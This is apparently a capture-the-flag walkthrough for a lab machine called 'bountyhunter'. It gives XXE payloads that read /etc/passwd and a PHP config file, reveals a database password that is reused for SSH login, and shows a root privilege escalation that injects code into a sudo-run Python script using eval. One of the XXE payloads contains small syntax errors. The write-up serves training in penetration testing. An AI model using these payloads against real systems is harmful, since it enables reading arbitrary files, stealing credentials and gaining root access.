bountyhunter
---

site = 10.10.11.100

## Steps

1. Find the upload page `http://10.10.11.100/log_submit.php`
2. When we submit a form, we see that it sends a POST request to `http://10.10.11.100/tracker_diRbPr00f314.php`
3. We also observe the data that was sent over, which is a base64 encoding of an XML file

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5hPC90aXRsZT4KCQk8Y3dlPmE8L2N3ZT4KCQk8Y3Zzcz5hPC9jdnNzPgoJCTxyZXdhcmQ+YTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==

<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>a</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>a</reward>
		</bugreport>
```

4. From this, we can craft our own XML files and send it directly to `http://10.10.11.100/tracker_diRbPr00f314.php`

```
prints out all the users
---
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&ent;</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>a</reward>
		</bugreport>

get db.php file
---
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db/php">]>
		<bugreport>
		<title>&ent;</title>
		<cwe>a</cwe>
		<cvss>a</cvss>
		<reward>a</reward>
		</bugreport>
```

After decoding the contents of db.php, we get a password

```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Observing the contents of `/etc/passwd`, we see that only these 2 accounts have bash shell enabled
- root
- development

We try to ssh into the server using `development` and the password above

```
> ssh development@10.10.11.100
```

Get in and cat the flag.

Notes
---

It seems like we can't directly LFI the contents of `/home/development/user.txt` via the XML exploit due to read permissions. The server was probably under the user `www-data`, while the permissions of `user.txt` was `o:root g:development`

ROOT FLAG
---

After logging in to get the shell, we see that we can run this command as sudo

```
sudo -l

/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Looking at the script, tldr, `eval` is bad

```
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```

We craft this file that prints the contents of root

```
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**25+1,print(open("/root/root.txt").read())
```
